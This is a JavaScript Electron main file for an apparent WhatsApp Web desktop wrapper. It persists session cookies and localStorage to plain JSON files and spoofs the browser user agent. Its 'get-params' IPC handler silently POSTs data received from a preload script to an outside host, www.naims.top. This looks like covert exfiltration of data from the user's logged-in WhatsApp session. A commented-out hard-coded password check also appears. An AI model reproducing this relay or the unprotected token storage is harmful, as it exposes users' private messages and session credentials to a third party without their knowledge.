const { app, BrowserWindow, BrowserView } = require("electron/main");
const path = require("path");
const { ipcMain, net } = require("electron");

const fs = require("fs");

function saveCookies(webContents) {
  webContents.session.cookies
    .get({})
    .then((cookies) => {
      fs.writeFileSync(
        path.join(__dirname, "cookies.json"),
        JSON.stringify(cookies)
      );
    })
    .catch((error) => {
      console.error("Failed to save cookies:", error);
    });
}
function saveLocalStorage(webContents) {
  webContents
    .executeJavaScript(
      `
      JSON.stringify(localStorage);
  `
    )
    .then((localStorageData) => {
      fs.writeFileSync(
        path.join(__dirname, "localStorage.json"),
        localStorageData
      );
    })
    .catch((error) => {
      console.error("Failed to save localStorage:", error);
    });
}

function loadCookies(webContents) {
  const cookiesPath = path.join(__dirname, "cookies.json");

  if (fs.existsSync(cookiesPath)) {
    const cookies = JSON.parse(fs.readFileSync(cookiesPath));

    cookies.forEach((cookie) => {
      if (!cookie.url) {
        cookie.url = `https://${
          cookie.domain.startsWith(".") ? cookie.domain.slice(1) : cookie.domain
        }${cookie.path}`;
      }
      webContents.session.cookies.set(cookie).catch((error) => {
        console.error("Failed to load cookie:", error);
      });
    });
  }
}

function loadLocalStorage(webContents) {
  const localStoragePath = path.join(__dirname, "localStorage.json");

  if (fs.existsSync(localStoragePath)) {
    const localStorageData = fs.readFileSync(localStoragePath, "utf-8");

    webContents
      .executeJavaScript(
        `
          const data = ${localStorageData};
          Object.keys(data).forEach(key => localStorage.setItem(key, data[key]));
      `
      )
      .catch((error) => {
        console.error("Failed to load localStorage:", error);
      });
  }
}

const createWindow = () => {
  const mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
  });

  const view = new BrowserView({
    webPreferences: {
      // devTools: true,
      contextIsolation: true,
      preload: path.resolve(__dirname, "content.js"),
    },
  });
  mainWindow.setBrowserView(view);
  view.setBounds({ x: 0, y: 0, width: 1000, height: 800 });
  view.setAutoResize({ width: true });

  app.on("before-quit", () => {
    saveCookies(view.webContents); // 在关闭应用前保存 cookies
    saveLocalStorage(view.webContents); // 在关闭应用前保存 localStorage
  });

  loadCookies(view.webContents);
  view.webContents.on("did-finish-load", () => {
    loadLocalStorage(view.webContents); // 在页面加载完成后注入 localStorage 数据
  });
  view.webContents.loadURL("https://web.whatsapp.com", {
    userAgent:
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  });
  // view.webContents.openDevTools();

  let lastHandle;
  function handleWindowResize(e) {
    e.preventDefault();

    lastHandle = setTimeout(() => {
      if (lastHandle != null) clearTimeout(lastHandle);
      if (mainWindow)
        view.setBounds({
          x: 0,
          y: 0,
          width: mainWindow.getBounds().width,
          height: mainWindow.getBounds().height - 60,
        });
    });
  }

  mainWindow.on("resize", handleWindowResize);

  ipcMain.on("get-params", (event, data) => {
    // 在这里处理收到的消息
    const url = "https://www.naims.top/transfer/send/data";
    const request = net.request({
      method: "POST",
      url: url,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
    });

    request.write(data);
    request.end();
  });
};

// const vliadPassword = (cb) => {
//   const splash = new BrowserWindow({
//     width: 800,
//     height: 600,
// devTools: true,
// webPreferences: {
//   preload: path.join(__dirname, "preload.js"),
// },
// });

// splash.loadFile("index.html");
// splash.center();
// splash.webContents.openDevTools();

// ipcMain.on('send-password', (event, arg) => {
//   if (arg === '84886227') {
//     splash.close();
//     cb();
//   }
// });
// };

app.whenReady().then(() => {
  // vliadPassword(createWindow);
  createWindow();

  app.on("activate", () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") {
    app.quit();
  }
});
